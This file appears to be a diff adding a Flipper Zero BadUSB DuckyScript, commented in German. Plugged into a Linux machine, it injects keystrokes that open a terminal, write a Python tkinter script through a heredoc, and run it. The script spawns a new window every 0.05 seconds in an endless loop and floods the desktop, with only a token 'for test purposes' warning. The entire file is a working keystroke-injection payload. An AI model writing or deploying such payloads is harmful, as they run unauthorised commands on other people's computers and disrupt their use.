@@ -1,0 +1,86 @@
+REM Flipper Zero BadUSB / DuckyScript - High Speed Version
+REM Oeffnet das Terminal und schreibt den Code direkt via HEREDOC in die Datei.
+DEFAULT_DELAY 20
+REM 1. Terminal oeffnen (Strg + Alt + T)
+DELAY 500
+CTRL ALT t
+DELAY 800
+REM 2. Datei in einem Zug erstellen (ohne Nano zu oeffnen)
+STRING cat << 'EOF' > Test.py
+ENTER
+STRING import tkinter as tk
+ENTER
+STRING from tkinter import messagebox
+ENTER
+STRING import time, threading
+ENTER
+STRING print("=" * 60 + "\nWARNHINWEIS:\nDieser Code ist fuer Testzwecke gedacht!\n" + "=" * 60)
+ENTER
+STRING fenster_zahler = 0
+ENTER
+STRING stoppen_flag = False
+ENTER
+STRING def create_window():
+ENTER
+STRING     global fenster_zahler
+ENTER
+STRING     fenster_zahler += 1
+ENTER
+STRING     current_time = time.strftime("%H:%M:%S", time.localtime())
+ENTER
+STRING     try:
+ENTER
+STRING         window = tk.Toplevel(root)
+ENTER
+STRING         window.title(f"Test-Fenster-Nummer {fenster_zahler}")
+ENTER
+STRING         window.geometry("300x150")
+ENTER
+STRING         window.resizable(False, False)
+ENTER
+STRING         label = tk.Label(window, text=f"Gefertigt um: {current_time}", font=("Helvetica", 12), bg="lightblue")
+ENTER
+STRING         label.pack(expand=True)
+ENTER
+STRING     except Exception as e:
+ENTER
+STRING         print(f"Fehler beim Erstellen von Fenster {fenster_zahler}: {e}")
+ENTER
+STRING def main_loop():
+ENTER
+STRING     global stoppen_flag
+ENTER
+STRING     while not stoppen_flag:
+ENTER
+STRING         create_window()
+ENTER
+STRING         time.sleep(0.05)
+ENTER
+STRING root = tk.Tk()
+ENTER
+STRING root.title("Endlosschleife Demonstrator")
+ENTER
+STRING root.geometry("400x300")
+ENTER
+STRING main_label = tk.Label(root, text="DEMONSTRATION", bg="yellow", font=("Arial", 12))
+ENTER
+STRING main_label.pack(pady=50)
+ENTER
+STRING thread = threading.Thread(target=main_loop, daemon=True)
+ENTER
+STRING thread.start()
+ENTER
+STRING try:
+ENTER
+STRING     root.mainloop()
+ENTER
+STRING except KeyboardInterrupt:
+ENTER
+STRING     pass
+ENTER
+STRING EOF
+ENTER
+DELAY 200
+REM 3. Skript direkt ausfuehren
+STRING python3 Test.py
+ENTER
